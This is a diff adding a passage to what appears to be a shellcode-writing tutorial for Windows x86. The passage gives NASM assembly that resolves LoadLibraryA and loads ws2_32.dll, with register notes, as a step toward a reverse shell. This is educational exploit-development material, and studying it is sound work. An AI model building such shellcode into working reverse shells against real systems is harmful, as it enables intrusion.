@@ -204,6 +204,40 @@ This outputs the exact `DWORD` values to push onto the stack.
 C:\Users\IEUser\Documents>a2h.py LoadLibraryA
 [u'41797261', u'7262694c', u'64616f4c']
 ```
+So we push those onto the stack. Save a pointer to the string with `push esp` and then we `push ebx` which is the address of the library that `LoadLibraryA` is exported from, `kernel32.dll`. 
+
+Now, the address of `LoadLibraryA` is stored in EAX. 
+
+We can use this function to load the library `ws2_32.dll` into memory. This library holds all of the socket functions we need to establish a reverse shell. 
+
+```nasm
+; use LoadLibraryA to load the ws2_32.dll
+push 0x61616c6c
+sub word [esp + 0x2], 0x6161
+push 0x642e3233
+push 0x5f327377
+push esp
+call eax
+```
+
+We have to push the string `ws2_32.dll` onto the stack, but since it doesn't break up nicely into 4 byte chunks, we can add `aa` to it and use the python script again. 
+```terminal_session
+C:\Users\IEUser\Documents>a2h.py ws2_32.dllaa
+[u'61616c6c', u'642e3233', u'5f327377']
+```
+
+So we push the first `DWORD` and then subtract off the `aa` value just like @NytroRST showed us. Then we push the rest, push a stack pointer, and then call `LoadLibraryA`. 
+
+Now is a good time to do a register check, here is what our registers look like at this point. 
+```
+; EAX = ws2_32.dll address
+; ECX = ???
+; EDX = some sort of offset
+; EBX = kernel32 base address
+; ESP = pointer to string "ws2_32.dll'
+; ESI = some address
+; EDI = GetProcAddress address
+```
 
 
 
